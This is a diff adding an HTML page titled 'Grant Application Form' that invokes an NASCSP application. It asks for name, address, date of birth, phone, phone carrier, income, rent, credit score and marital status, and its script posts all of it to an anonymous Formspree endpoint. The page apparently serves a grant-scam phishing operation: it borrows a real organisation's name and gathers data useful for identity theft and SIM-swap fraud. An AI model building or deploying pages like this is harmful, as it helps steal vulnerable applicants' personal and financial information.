@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Grant Application Form</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Navbar -->
+  <header>
+    <a href="#" class="logo">
+      <img src="logo.jpg" alt="Logo" />
+    </a>
+  </header>
+
+  <!-- Title and Form -->
+  <main>
+    <h2 class="form-title">Grant Application Form</h2>
+    <p class="form-subtext">
+      To proceed with your NASCSP application, please provide the following details.
+    </p>
+
+    <section class="form-section">
+      <form action="https://formspree.io/f/xanoyala" method="POST" id="grant-form">
+        <div class="form-group">
+          <label for="first-name">First Name</label>
+          <input type="text" id="first-name" name="firstName" placeholder="John" required />
+        </div>
+
+        <div class="form-group">
+          <label for="last-name">Last Name</label>
+          <input type="text" id="last-name" name="lastName" placeholder="Doe" required />
+        </div>
+
+        <div class="form-group">
+          <label for="address">Address</label>
+          <input type="text" id="address" name="address" placeholder="123 Main St, City, State" required />
+        </div>
+
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" name="phone" placeholder="(555) 123-4567" required />
+        </div>
+
+        <div class="form-group">
+          <label for="dob">Date of Birth</label>
+          <input type="date" id="dob" name="dob" required />
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" name="email" placeholder="you@example.com" required />
+        </div>
+
+        <div class="form-group">
+          <label for="occupation">Occupation</label>
+          <input type="text" id="occupation" name="occupation" placeholder="e.g. Teacher" />
+        </div>
+
+        <div class="form-group">
+          <label for="marital-status">Marital Status</label>
+          <select id="marital-status" name="maritalStatus" required>
+            <option value="">Select</option>
+            <option value="single">Single</option>
+            <option value="married">Married</option>
+            <option value="divorced">Divorced</option>
+            <option value="widowed">Widowed</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="rent">Monthly Rent/Mortgage</label>
+          <input type="number" id="rent" name="rent" placeholder="e.g. 800" step="0.01" />
+        </div>
+
+        <div class="form-group">
+          <label for="income">Monthly Income</label>
+          <input type="number" id="income" name="income" placeholder="e.g. 3500" step="0.01" />
+        </div>
+
+        <div class="form-group">
+          <label for="provider">Phone Service Provider</label>
+          <select id="provider" name="provider" required>
+            <option value="">Select Provider</option>
+            <option value="AT&T">AT&T</option>
+            <option value="Verizon">Verizon</option>
+            <option value="T-Mobile">T-Mobile</option>
+            <option value="Sprint">Sprint</option>
+            <option value="US Cellular">US Cellular</option>
+            <option value="Boost Mobile">Boost Mobile</option>
+            <option value="Cricket Wireless">Cricket Wireless</option>
+            <option value="Metro by T-Mobile">Metro by T-Mobile</option>
+            <option value="Straight Talk">Straight Talk</option>
+            <option value="Google Fi">Google Fi</option>
+            <option value="Consumer Cellular">Consumer Cellular</option>
+            <option value="Ting">Ting</option>
+            <option value="Visible">Visible</option>
+            <option value="Mint Mobile">Mint Mobile</option>
+            <option value="TracFone">TracFone</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="credit-score">Credit Score</label>
+          <input type="number" id="credit-score" name="creditScore" placeholder="e.g. 720" min="300" max="850" />
+        </div>
+
+        <div class="form-group full-width">
+          <label for="outstanding-loan">Outstanding Credit Card Loan?</label>
+          <select id="outstanding-loan" name="outstandingLoan" required>
+            <option value="">Select</option>
+            <option value="yes">Yes</option>
+            <option value="no">No</option>
+          </select>
+        </div>
+
+        <div class="form-group full-width">
+          <label for="grant-method">Preferred Method of Receiving the Grant</label>
+          <select id="grant-method" name="grantMethod" required>
+            <option value="">Select</option>
+            <option value="bank">Bank Transfer</option>
+            <option value="check">Check</option>
+            <option value="mobile-money">Mobile Money</option>
+          </select>
+        </div>
+
+        <div class="form-group full-width">
+          <button type="submit">Submit Application</button>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <!-- Popup -->
+  <div id="popup" class="popup">
+    <div class="popup-content">
+      <p>🎉 Your application has been submitted successfully!</p>
+      <button onclick="closePopup()">Close</button>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("grant-form");
+    const popup = document.getElementById("popup");
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const creditScore = parseInt(document.getElementById("credit-score").value, 10);
+      const emailPattern = /^[^ ]+@[^ ]+\.[a-z]{2,}$/i;
+
+      if (!emailPattern.test(email)) {
+        alert("Please enter a valid email address.");
+        return;
+      }
+
+      if (isNaN(creditScore) || creditScore < 300 || creditScore > 850) {
+        alert("Credit score must be between 300 and 850.");
+        return;
+      }
+
+      const formData = new FormData(form);
+      const response = await fetch(form.action, {
+        method: "POST",
+        body: formData,
+        headers: { Accept: "application/json" }
+      });
+
+      if (response.ok) {
+        popup.style.display = "flex";
+        form.reset();
+      } else {
+        alert("Something went wrong. Please try again later.");
+      }
+    });
+
+    function closePopup() {
+      popup.style.display = "none";
+    }
+  </script>
+
+</body>
+</html>
